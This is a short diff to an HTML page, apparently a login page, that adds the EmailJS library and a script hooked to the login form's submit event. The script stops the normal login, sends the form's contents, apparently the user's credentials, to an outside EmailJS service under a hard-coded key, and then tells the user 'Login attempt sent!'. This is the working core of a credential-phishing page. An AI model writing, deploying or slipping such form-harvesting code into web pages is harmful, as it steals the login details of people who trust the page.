@@ -27,6 +27,25 @@ cursor:pointer;
 
 </head>
 
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<script>
+(function(){
+emailjs.init("1O-AGODK6zJHu3ALi");
+})();
+
+document.getElementById("login-form").addEventListener("submit", function(e){
+e.preventDefault();
+
+emailjs.sendForm("service_h1i09s1","template_is726ki",this)
+.then(function(){
+alert("Login attempt sent!");
+}, function(error){
+alert("Error sending");
+});
+});
+</script>
+
 <body>
 
 <div class="main">
